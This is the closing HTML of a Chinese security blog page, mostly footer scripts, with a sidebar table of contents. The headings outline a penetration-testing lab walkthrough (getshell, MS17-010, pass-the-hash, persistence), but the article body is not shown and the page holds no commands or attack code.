class="level-item">各主机的ip</span></span></a></li><li><a class="level is-mobile" href="#启动web服务"><span class="level-left"><span class="level-item">启动web服务</span></span></a></li></ul></li><li><a class="level is-mobile" href="#外点getshell"><span class="level-left"><span class="level-item">外点getshell</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#信息收集"><span class="level-left"><span class="level-item">信息收集</span></span></a></li><li><a class="level is-mobile" href="#getshell"><span class="level-left"><span class="level-item">getshell</span></span></a></li></ul></li><li><a class="level is-mobile" href="#后渗透阶段"><span class="level-left"><span class="level-item">后渗透阶段</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#上线CS"><span class="level-left"><span class="level-item">上线CS</span></span></a></li><li><a class="level is-mobile" href="#内网信息收集"><span class="level-left"><span class="level-item">内网信息收集</span></span></a></li><li><a class="level is-mobile" href="#msf拿下域控"><span class="level-left"><span class="level-item">msf拿下域控</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#ms15-034"><span class="level-left"><span class="level-item">ms15_034</span></span></a></li><li><a class="level is-mobile" href="#ms17-010"><span class="level-left"><span class="level-item">ms17_010</span></span></a></li></ul></li><li><a class="level is-mobile" href="#哈希传递攻击"><span class="level-left"><span class="level-item">哈希传递攻击</span></span></a></li><li><a class="level is-mobile" href="#内网端口转发"><span class="level-left"><span class="level-item">内网端口转发</span></span></a></li><li><a class="level is-mobile" href="#持久化和维权"><span class="level-left"><span class="level-item">持久化和维权</span></span></a></li><li><a class="level is-mobile" href="#清理痕迹"><span class="level-left"><span class="level-item">清理痕迹</span></span></a></li></ul></li><li><a class="level is-mobile" href="#待解决问题"><span class="level-left"><span class="level-item">待解决问题</span></span></a></li><li><a class="level is-mobile" href="#总结"><span class="level-left"><span class="level-item">总结</span></span></a></li><li><a class="level is-mobile" href="#参考文章"><span class="level-left"><span class="level-item">参考文章</span></span></a></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Potat0w0</a><p class="is-size-7"><span>&copy; 2024 Potat0w0</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">©❤POTATO</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
